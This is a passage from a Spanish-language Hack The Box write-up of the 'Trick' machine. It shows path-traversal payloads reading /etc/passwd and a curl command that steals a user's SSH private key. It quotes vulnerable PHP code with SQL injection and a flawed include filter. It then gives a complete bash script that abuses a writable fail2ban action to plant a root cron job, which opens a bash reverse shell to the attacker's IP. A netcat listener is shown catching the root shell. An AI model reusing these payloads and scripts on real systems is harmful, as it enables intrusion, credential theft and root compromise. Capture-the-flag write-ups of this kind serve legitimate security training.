ID           Response   Lines    Word       Chars       Payload                                                                                                       ===================================================================== 
000000327:   200        41 L     68 W       2351 Ch     "....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd"         
000000330:   200        41 L     68 W       2351 Ch     "....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd" 
000000328:   200        41 L     68 W       2351 Ch     "....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....
000000332:   200        41 L     68 W       2351 Ch     "....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd"
000000331:   200        41 L     68 W       2351 Ch     "....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd"                                                              
000000342:   200        41 L     68 W       2351 Ch     "....//....//....//....//....//....//....//etc/passwd"
000000346:   200        41 L     68 W       2351 Ch     "....//....//....//etc/passwd"                                      
000000338:   200        41 L     68 W       2351 Ch     "....//....//....//....//....//....//....//....//....//....//....//etc/passwd"
000000329:   200        41 L     68 W       2351 Ch     "....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd"                                            
000000336:   200        41 L     68 W       2351 Ch     "....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd"                 
000000345:   200        41 L     68 W       2351 Ch     "....//....//....//....//etc/passwd"                                                                       
000000344:   200        41 L     68 W       2351 Ch     "....//....//....//....//....//etc/passwd"                                                                 
000000341:   200        41 L     68 W       2351 Ch     "....//....//....//....//....//....//....//....//etc/passwd"                                               
000000343:   200        41 L     68 W       2351 Ch     "....//....//....//....//....//....//etc/passwd"                                                           
000000340:   200        41 L     68 W       2351 Ch     "....//....//....//....//....//....//....//....//....//etc/passwd"                                         
000000337:   200        41 L     68 W       2351 Ch     "....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd"                       
000000339:   200        41 L     68 W       2351 Ch     "....//....//....//....//....//....//....//....//....//....//etc/passwd"
</span></pre></table></code></div></div><p>Al final logramos explotar la vulnerabilidad y listar archivos del servidor. El archivo <em>/etc/hosts</em> nos dió la información que existe un usuario llamado <code class="language-plaintext highlighter-rouge">michael</code>, y ya que podemos listar archivos y tenemos abierto el puerto <strong>22 (SSH)</strong> abierto, intentamos extraer la <strong>llave privada RSA</strong> alojada en <code class="language-plaintext highlighter-rouge">/&lt;user_home_directory&gt;/.ssh/id_rsa</code></p><p>Al final conseguimos extraerla y nos conectamos satisfactoriamente por <strong>SSH</strong> y conseguimos la flag:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre><td class="rouge-code"><pre><span class="gp">❯ curl http://preprod-marketing.trick.htb/index.php?page=....//....//....//home/michael/.ssh/id_rsa &gt;</span><span class="w"> </span>id_rsa_michael
<span class="go">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1823    0  1823    0     0   8530      0 --:--:-- --:--:-- --:--:--  8518
❯ chmod 600 id_rsa_michael
❯ ssh -i id_rsa_michael michael@10.10.11.166
The authenticity of host '10.10.11.166 (10.10.11.166)' can't be established.
ED25519 key fingerprint is SHA256:CUKzxire1i5wxTO1zNuBswEtE0u/RyyjZ+v07fOUuYY.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.166' (ED25519) to the list of known hosts.
</span><span class="gp">Linux trick 4.19.0-20-amd64 #</span>1 SMP Debian 4.19.235-1 <span class="o">(</span>2022-03-17<span class="o">)</span> x86_64
<span class="go">
</span><span class="gp">The programs included with the Debian GNU/Linux system are free software;</span><span class="w">
</span><span class="go">the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon Sep 12 22:27:25 2022 from 10.10.14.48
</span><span class="gp">michael@trick:~$</span><span class="w"> </span>find / <span class="nt">-name</span> user.txt <span class="nt">-exec</span> <span class="nb">ls</span> <span class="nt">-l</span> <span class="o">{}</span> + 2&gt;/dev/null
<span class="go">-rw-r----- 1 root michael 33 Sep 12 22:13 /home/michael/user.txt
</span></pre></table></code></div></div><p>Ya que tenemos acceso al servidor, a continuación validamos las malas prácticas que nos proporcionaron explotar las vulnerabilidades anteriores:</p><blockquote><p>Inyección SQL (file: /var/www/payroll/admin_class.php)</p></blockquote><div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
<span class="mf">...</span>
<span class="k">function</span> <span class="n">login</span><span class="p">(){</span>
  <span class="nb">extract</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">);</span>
  <span class="nv">$qry</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="n">db</span><span class="o">-&gt;</span><span class="nf">query</span><span class="p">(</span><span class="s2">"SELECT * FROM users where username = '"</span><span class="mf">.</span><span class="nv">$username</span><span class="mf">.</span><span class="s2">"' and password = '"</span><span class="mf">.</span><span class="nv">$password</span><span class="mf">.</span><span class="s2">"' "</span><span class="p">);</span> <span class="o">&lt;--</span> <span class="s1">'.'</span> <span class="n">concatenation</span>
  <span class="k">if</span><span class="p">(</span><span class="nv">$qry</span><span class="o">-&gt;</span><span class="n">num_rows</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$qry</span><span class="o">-&gt;</span><span class="nf">fetch_array</span><span class="p">()</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$value</span><span class="p">)</span> <span class="p">{</span>
      <span class="k">if</span><span class="p">(</span><span class="nv">$key</span> <span class="o">!=</span> <span class="s1">'passwors'</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nb">is_numeric</span><span class="p">(</span><span class="nv">$key</span><span class="p">))</span>
        <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'login_'</span><span class="mf">.</span><span class="nv">$key</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$value</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="k">return</span> <span class="mi">3</span><span class="p">;</span>
  <span class="p">}</span>
<span class="p">}</span>
<span class="mf">...</span>
<span class="cp">?&gt;</span>
</pre></table></code></div></div><blockquote><p>Local File Inclusion (file: /var/www/market/index.php)</p></blockquote><div class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="PHP"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
<span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'page'</span><span class="p">];</span>

<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="k">isset</span><span class="p">(</span><span class="nv">$file</span><span class="p">)</span> <span class="o">||</span> <span class="p">(</span><span class="nv">$file</span><span class="o">==</span><span class="s2">"index.php"</span><span class="p">))</span> <span class="p">{</span>
   <span class="k">include</span><span class="p">(</span><span class="s2">"/var/www/market/home.html"</span><span class="p">);</span>
<span class="p">}</span>
<span class="k">else</span><span class="p">{</span>
        <span class="k">include</span><span class="p">(</span><span class="s2">"/var/www/market/"</span><span class="mf">.</span><span class="nb">str_replace</span><span class="p">(</span><span class="s2">"../"</span><span class="p">,</span><span class="s2">""</span><span class="p">,</span><span class="nv">$file</span><span class="p">));</span> <span class="o">&lt;--</span> <span class="n">non</span><span class="o">-</span><span class="n">recursive</span> <span class="n">constraint</span>
<span class="p">}</span>
<span class="cp">?&gt;</span>
</pre></table></code></div></div><h2 id="privilege-escalation"><span class="mr-2">Privilege Escalation</span><a href="#privilege-escalation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><hr /><p>En el proceso de realizar una enumeración básica del sistema y del usuario actual, obervamos que tenemos permitido ejecutar un binario como el usuario <code class="language-plaintext highlighter-rouge">root</code> sin proporcionar una contraseña:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="gp">michael@trick:~$</span><span class="w"> </span><span class="nb">sudo</span> <span class="nt">-l</span>
<span class="go">Matching Defaults entries for michael on trick:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User michael may run the following commands on trick:
    (root) NOPASSWD: /etc/init.d/fail2ban restart
</span></pre></table></code></div></div><p>Antes de intentar algo nos informamos que es <code class="language-plaintext highlighter-rouge">fail2ban</code>:</p><blockquote><p>Fail2ban es una herramienta que asigna ciertas reglas especificadas (bloqueo de ip, etc), que alteran configuraciones del firewall, al momento de intentos fallidos de inicios de sesión</p></blockquote><p><strong>Fail2ban</strong> tiene como propósito monitorear los logs de servicios comúnes, filtrar los logs respecto a autenticaciones fallidas y tomar acciones</p><p>Investigando en internet de su funcionamiento encontramos que <a href="https://youssef-ichioui.medium.com/abusing-fail2ban-misconfiguration-to-escalate-privileges-on-linux-826ad0cdafb7">existe una mala configuración que permite escalar privilegios</a>. En palabras simples, podemos provocar un baneo que ejecute código malicioso al momento de tomar una acción hacia nosotros</p><p>Primero debemos conocer para que servicios está activo <strong>Fail2ban</strong>, para ello tenemos los archivos de configuración <code class="language-plaintext highlighter-rouge">/etc/fail2ban/jail.conf</code> y <code class="language-plaintext highlighter-rouge">/etc/fail2ban/jail.d/defaults-debian.conf</code>, donde encontramos las políticas por defecto y que servicios están activos</p><blockquote><p>Revisamos en el archivo principal de configuración</p></blockquote><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre><span class="gp">michael@trick:~$</span><span class="w"> </span>less /etc/fail2ban/jail.conf
<span class="c">...
</span><span class="gp">#</span><span class="w">
</span><span class="gp">#</span><span class="w"> </span>SSH servers
<span class="gp">#</span><span class="w">
</span><span class="go">
[sshd]

</span><span class="gp">#</span><span class="w"> </span>To use more aggressive sshd modes <span class="nb">set </span>filter parameter <span class="s2">"mode"</span> <span class="k">in </span>jail.local:
<span class="gp">#</span><span class="w"> </span>normal <span class="o">(</span>default<span class="o">)</span>, ddos, extra or aggressive <span class="o">(</span>combines all<span class="o">)</span><span class="nb">.</span>
<span class="gp">#</span><span class="w"> </span>See <span class="s2">"tests/files/logs/sshd"</span> or <span class="s2">"filter.d/sshd.conf"</span> <span class="k">for </span>usage example and details.
<span class="gp">#</span>mode   <span class="o">=</span> normal
<span class="go">port    = ssh
logpath = %(sshd_log)s
backend = %(sshd_backend)s
bantime = 10s
</span><span class="c">...
</span></pre></table></code></div></div><blockquote><p>No vemos un <code class="language-plaintext highlighter-rouge">enable = true</code> que indique que está activo, por ello revisamos el otro archivo de configuración y aseguramos que el servicio <strong>SSHD (ssh daemon)</strong> está activado</p></blockquote><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="gp">michael@trick:~$</span><span class="w"> </span><span class="nb">cat</span> /etc/fail2ban/jail.d/defaults-debian.conf 
<span class="go">[sshd]
enabled = true
</span></pre></table></code></div></div><p>Ahora debemos asegurarnos las acciones que se establecerán cuando provoquemos el baneo, para ello revisamos el archivo de configuración <code class="language-plaintext highlighter-rouge">/etc/fail2ban/jail.conf</code></p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre><span class="gp">michael@trick:~$</span><span class="w"> </span>less /etc/fail2ban/jail.conf
<span class="c">...
</span><span class="gp">#</span><span class="w">
</span><span class="gp">#</span><span class="w"> </span>Action shortcuts. To be used to define action parameter
<span class="go">
</span><span class="gp">#</span><span class="w"> </span>Default banning action <span class="o">(</span>e.g. iptables, iptables-new,
<span class="gp">#</span><span class="w"> </span>iptables-multiport, shorewall, etc<span class="o">)</span> It is used to define
<span class="gp">#</span><span class="w"> </span>action_<span class="k">*</span> variables. Can be overridden globally or per
<span class="gp">#</span><span class="w"> </span>section within jail.local file
<span class="go">banaction = iptables-multiport &lt;--- ban action!
banaction_allports = iptables-allports
</span><span class="c">...
</span></pre></table></code></div></div><p>El nombre especificado apunta a la ruta <code class="language-plaintext highlighter-rouge">/etc/fail2ban/action.d/&lt;banaction&gt;.conf</code> y es el encargado de configurar el firewall y así prohibir los hosts que provoquen el baneo</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="gp">michael@trick:~$</span><span class="w"> </span>less /etc/fail2ban/action.d/iptables-multiport.conf
<span class="c">...
</span><span class="gp">#</span><span class="w"> </span>Option:  actionban
<span class="gp">#</span><span class="w"> </span>Notes.:  <span class="nb">command </span>executed when banning an IP. Take care that the
<span class="gp">#</span><span class="w">          </span><span class="nb">command </span>is executed with Fail2Ban user rights.
<span class="gp">#</span><span class="w"> </span>Tags:    See jail.conf<span class="o">(</span>5<span class="o">)</span> man page
<span class="gp">#</span><span class="w"> </span>Values:  CMD
<span class="gp">#</span><span class="w">
</span><span class="gp">actionban = &lt;iptables&gt;</span><span class="w"> </span><span class="nt">-I</span> f2b-&lt;name&gt; 1 <span class="nt">-s</span> &lt;ip&gt; <span class="nt">-j</span> &lt;blocktype&gt; &lt;<span class="nt">---</span> Here
<span class="c">...
</span></pre></table></code></div></div><p>El archivo anterior es el que se activará cuando provoquemos el baneo y ejecutar la acción <code class="language-plaintext highlighter-rouge">actionban = &lt;iptables&gt; -I f2b-&lt;name&gt; 1 -s &lt;ip&gt; -j &lt;blocktype&gt;</code>, que como vemos puede ser un comando</p><blockquote><p>Antes de eso debemos saber los intentos que tenemos antes de ser baneados y por cuanto tiempo será, eso también lo vemos en el archivo de configuración</p></blockquote><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre><span class="gp">michael@trick:~$</span><span class="w"> </span>less /etc/fail2ban/jail.conf
<span class="c">...
</span><span class="gp">#</span><span class="w"> </span><span class="s2">"bantime"</span> is the number of seconds that a host is banned.
<span class="go">bantime  = 10s

</span><span class="gp">#</span><span class="w"> </span>A host is banned <span class="k">if </span>it has generated <span class="s2">"maxretry"</span> during the last <span class="s2">"findtime"</span>
<span class="gp">#</span><span class="w"> </span>seconds.
<span class="go">findtime  = 10s

</span><span class="gp">#</span><span class="w"> </span><span class="s2">"maxretry"</span> is the number of failures before a host get banned.
<span class="go">maxretry = 5 &lt;--- Here (important)
</span><span class="c">...
</span></pre></table></code></div></div><p>Ahora solo queda modificar la acción <code class="language-plaintext highlighter-rouge">actionban = MALICIOUS CODE</code>, reiniciar el servicio <code class="language-plaintext highlighter-rouge">fail2ban</code> que lo ejecutará como <code class="language-plaintext highlighter-rouge">root</code> gracias a los permisos que tenemos, luego nos logearemos por <strong>SSH</strong> provocando el máximo de intentos (5) para ser baneados y activar <code class="language-plaintext highlighter-rouge">actionban</code> que ejecutará nuestro comando</p><p>Para el proceso junte cada tarea en un script en <code class="language-plaintext highlighter-rouge">bash</code> que explica el proceso y te permite conseguir acceso como <code class="language-plaintext highlighter-rouge">root</code> a traves de una tarea cron inyectada:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
</pre><td class="rouge-code"><pre><span class="c">#!/bin/bash</span>

<span class="c"># Fail2ban privesc (sshd service)</span>
<span class="c"># ----------------</span>


<span class="c"># Remote machine</span>
<span class="c"># ---------------</span>

<span class="c"># actionban config file</span>
<span class="nv">fail2ban_rule_conf</span><span class="o">=</span>/etc/fail2ban/action.d/iptables-multiport.conf

<span class="c"># check user:group permissions (root:root)</span>
<span class="nb">ls</span> <span class="nt">-l</span> <span class="nv">$fail2ban_rule_conf</span>

<span class="c"># change user:group to writeable permisisons</span>
<span class="nb">cp</span> <span class="nv">$fail2ban_rule_conf</span><span class="o">{</span>,.bak<span class="o">}</span>
<span class="nb">mv</span> <span class="nt">-f</span> <span class="nv">$fail2ban_rule_conf</span>.bak <span class="nv">$fail2ban_rule_conf</span>

<span class="c"># check user:group permission (michale:michael)</span>
<span class="nb">ls</span> <span class="nt">-l</span> <span class="nv">$fail2ban_rule_conf</span>

<span class="c"># commands to create cron process to receive privileged reverse shell</span>
<span class="k">if</span> <span class="o">[</span> <span class="nt">-d</span> <span class="s2">"/tmp/.privesc"</span> <span class="o">]</span><span class="p">;</span> <span class="k">then
  </span><span class="nb">rm</span> <span class="nt">-rf</span> <span class="s2">"/tmp/.privesc"</span>
<span class="k">fi
</span><span class="nv">create_dir</span><span class="o">=</span><span class="s2">"mkdir /tmp/.privesc"</span>
<span class="nv">assing_cron</span><span class="o">=</span><span class="s2">"echo '* * * * * root /bin/sh /tmp/.privesc/pwned.sh' &gt; /etc/cron.d/pwned;"</span>
<span class="nv">cron_script</span><span class="o">=</span><span class="s2">"echo </span><span class="se">\"</span><span class="s2">bash -c 'bash -i &gt;&amp; /dev/tcp/</span><span class="nv">$1</span><span class="s2">/</span><span class="nv">$2</span><span class="s2"> 0&gt;&amp;1'</span><span class="se">\"</span><span class="s2"> &gt; /tmp/.privesc/pwned.sh;"</span>
<span class="nv">add_perm</span><span class="o">=</span><span class="s2">"chmod +x /tmp/.privesc/pwned.sh;"</span>

<span class="c"># save commands in file</span>
<span class="nv">$create_dir</span>
<span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="nv">$assing_cron</span><span class="se">\n</span><span class="nv">$cron_script</span><span class="se">\n</span><span class="nv">$add_perm</span><span class="s2">"</span> <span class="o">&gt;</span> /tmp/.privesc/cmd.sh
<span class="nb">chmod</span> +x /tmp/.privesc/cmd.sh

<span class="c"># change actionban to execute malicious file</span>
<span class="nb">sed</span> <span class="nt">-i</span> <span class="s1">'s/actionban = &lt;iptables&gt; -I f2b-&lt;name&gt; 1 -s &lt;ip&gt; -j &lt;blocktype&gt;/actionban = \/bin\/bash \/tmp\/.privesc\/cmd.sh/g'</span> <span class="nv">$fail2ban_rule_conf</span>

<span class="c"># restart fail2ban service </span>
<span class="nb">sudo</span> /etc/init.d/fail2ban restart


<span class="c"># Local machine</span>
<span class="c"># -------------</span>

<span class="nb">sleep </span>3
<span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">Make failed ssh requests in ATTACKER machine to activate fail2ban rules (maxretry = 5)"</span>
<span class="nb">echo</span> <span class="s2">"Example: for i in </span><span class="se">\$</span><span class="s2">(seq 1 10); do sshpass -p 'anything' ssh michael@10.10.11.166; done"</span>

<span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">Listen on IP </span><span class="nv">$1</span><span class="s2"> through PORT </span><span class="nv">$2</span><span class="s2"> to receive the shell. (g.e nc -lvnp </span><span class="nv">$2</span><span class="s2">)</span><span class="se">\n</span><span class="s2">"</span>
</pre></table></code></div></div><blockquote class="prompt-info"><div><p>Puedes encontrar el script en mi repositorio <a href="https://github.com/E1P0TR0/CVE-Machines_htb/blob/main/Auto-tool_Trick/f2b_privesc.sh">https://github.com/E1P0TR0</a></p></div></blockquote><p>Ahora solo lo ejecutamos y conseguimos la flag:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
</pre><td class="rouge-code"><pre><span class="gp">michael@trick:/tmp$</span><span class="w"> </span>./privesc.sh 10.10.14.58 1234
<span class="go">-rw-r--r-- 1 michael michael 1401 Sep 13 02:42 /etc/fail2ban/action.d/iptables-multiport.conf
-rw-r--r-- 1 michael michael 1401 Sep 13 02:44 /etc/fail2ban/action.d/iptables-multiport.conf
[ ok ] Restarting fail2ban (via systemctl): fail2ban.service.

Make failed ssh requests in ATTACKER machine to activate fail2ban rules (maxretry = 5)
</span><span class="gp">Example: for i in $</span><span class="o">(</span><span class="nb">seq </span>1 6<span class="o">)</span><span class="p">;</span> <span class="k">do </span>sshpass <span class="nt">-p</span> <span class="s1">'anything'</span> ssh michael@10.10.11.166<span class="p">;</span> <span class="k">done</span>
<span class="go">
Listen on IP 10.10.14.58 through PORT 1234 to receive the shell. (g.e nc -lvnp 1234)

</span><span class="gp">michael@trick:/tmp$</span><span class="w"> 
</span><span class="go">
─────────────────────────────────────────────────────────────────────────────────────────────────
</span><span class="gp">❯ for i in $</span><span class="o">(</span><span class="nb">seq </span>1 6<span class="o">)</span><span class="p">;</span> <span class="k">do </span>sshpass <span class="nt">-p</span> <span class="s1">'anything'</span> ssh michael@10.10.11.166<span class="p">;</span> <span class="k">done</span>
<span class="go">Permission denied, please try again.
Permission denied, please try again.
Permission denied, please try again.
Permission denied, please try again.
Permission denied, please try again.
Permission denied, please try again.
❯ nc -lvnp 1234
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from 10.10.11.166.
Ncat: Connection from 10.10.11.166:36098.
bash: cannot set terminal process group (4074): Inappropriate ioctl for device
bash: no job control in this shell
</span><span class="gp">root@trick:~#</span><span class="w"> </span>find / <span class="nt">-name</span> root.txt | xargs <span class="nb">ls</span> <span class="nt">-l</span>
<span class="go">find / -name root.txt | xargs ls -l
-rw-r----- 1 root root 33 Sep 12 22:13 /root/root.txt
</span></pre></table></code></div></div><blockquote class="prompt-info"><div><p>Aquí tienes un articulo muy detallado sobre <strong>Fail2ban</strong> <a href="https://www.digitalocean.com/community/tutorials/how-fail2ban-works-to-protect-services-on-a-linux-server">https://www.digitalocean.com/community/tutorials/how-fail2ban-works-to-protect-services-on-a-linux-server</a></p></div></blockquote></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/htb/'>HTB</a>, <a href='/categories/writeups/'>Writeups</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/htb/" class="post-tag no-text-decoration" >HTB</a> <a href="/tags/linux/" class="post-tag no-text-decoration" >Linux</a> <a href="/tags/easy/" class="post-tag no-text-decoration" >Easy</a> <a href="/tags/bash-scripting/" class="post-tag no-text-decoration" >Bash Scripting</a> <a href="/tags/lfi/" class="post-tag no-text-decoration" >LFI</a> <a href="/tags/dns/" class="post-tag no-text-decoration" >DNS</a> <a href="/tags/fail2ban/" class="post-tag no-text-decoration" >Fail2ban</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Hackthebox Writeup Trick - Marss&amp;url=https://e1p0tr0.github.io/posts/HTBTrick/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Hackthebox Writeup Trick - Marss&amp;u=https://e1p0tr0.github.io/posts/HTBTrick/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https://e1p0tr0.github.io/posts/HTBTrick/&amp;text=Hackthebox Writeup Trick - Marss" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/HTBMeta/">Hackthebox Writeup Meta</a><li><a href="/posts/HTBPhotobomb/">Hackthebox Writeup Photobomb</a><li><a href="/posts/HTBZipping/">Zipping Report</a><li><a href="/posts/HTBJupiter/">Jupiter Report</a><li><a href="/posts/HTBSau/">Sau Notes</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/htb/">HTB</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/python-scripting/">Python Scripting</a> <a class="post-tag" href="/tags/easy/">Easy</a> <a class="post-tag" href="/tags/medium/">Medium</a> <a class="post-tag" href="/tags/bash-scripting/">Bash Scripting</a> <a class="post-tag" href="/tags/information-leakage/">Information Leakage</a> <a class="post-tag" href="/tags/hard/">Hard</a> <a class="post-tag" href="/tags/lfi/">LFI</a> <a class="post-tag" href="/tags/rce/">RCE</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/HTBSnoopy/"><div class="card-body"> <em class="timeago small" data-ts="1695229200" > 2023-09-20 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Snoopy Report</h3><div class="text-muted small"><p> Information gathering Scope: 10.10.11.212/32 (Linux) TCP Nmap scan: 65,535 ports Open ports: 22/ssh: Banner grabbing Version: OpenS...</p></div></div></a></div><div class="card"> <a href="/posts/HTBLate/"><div class="card-body"> <em class="timeago small" data-ts="1652136193" > 2022-05-09 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox Writeup Late</h3><div class="text-muted small"><p> Máquina Linux donde al enumerar encontramos un servicio web abierto que aplicaba Virtual Hosting y nos permitia llegar a otra web con un programa para convertir imágenes a texto Optical Character R...</p></div></div></a></div><div class="card"> <a href="/posts/HTBZipping/"><div class="card-body"> <em class="timeago small" data-ts="1694710800" > 2023-09-14 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Zipping Report</h3><div class="text-muted small"><p> Information gathering Scope: 10.10.11.229/32 (Linux) TCP Nmap scan: 65,535 ports Open ports: 22/ssh: Banner grabbing Version: 